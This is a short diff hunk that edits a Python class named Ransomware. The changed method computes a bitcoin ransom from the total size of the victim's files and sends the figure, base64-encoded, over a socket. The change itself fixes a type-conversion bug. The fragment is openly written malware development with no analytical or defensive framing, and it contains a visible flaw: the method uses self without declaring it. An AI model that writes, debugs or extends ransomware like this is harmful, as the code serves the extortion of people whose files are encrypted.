@@ -168,8 +168,9 @@ class Ransomware:
 
     def calculate_and_send_bitcoin_needed(size_of_files):
         #subin equation: 
-        bitcoin_needed = size_of_files/ 10000000
-        self._socket.sendall(base64.b64encode(int.to_bytes(bitcoin_needed))
+        bitcoin_needed = str(size_of_files/ 10000000)
+        self._socket.sendall(base64.b64encode(bitcoin_needed.encode("utf-8")))
+ 
         
         
 
